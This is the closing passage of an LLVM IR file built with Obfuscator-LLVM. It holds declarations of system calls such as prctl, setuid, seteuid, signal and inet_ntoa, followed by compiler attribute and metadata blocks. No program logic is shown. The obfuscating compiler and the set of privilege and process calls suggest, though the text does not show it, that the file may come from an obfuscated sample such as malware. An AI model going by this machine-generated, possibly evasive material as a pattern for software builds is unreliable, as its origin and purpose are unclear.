.loopexit78:                                      ; preds = %.loopexit78.loopexit128, %.loopexit78.loopexit, %23, %36
  ret i32 0
}

declare i32 @prctl(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setuid(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @seteuid(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #14

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { nounwind readonly }
attributes #15 = { nounwind returns_twice }
attributes #16 = { noreturn nounwind }
attributes #17 = { nounwind readnone }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146710168}
!2 = !{i32 -2146709460}
!3 = distinct !{!3, !4}
!4 = !{!"llvm.loop.unroll.disable"}
!5 = distinct !{!5, !4}
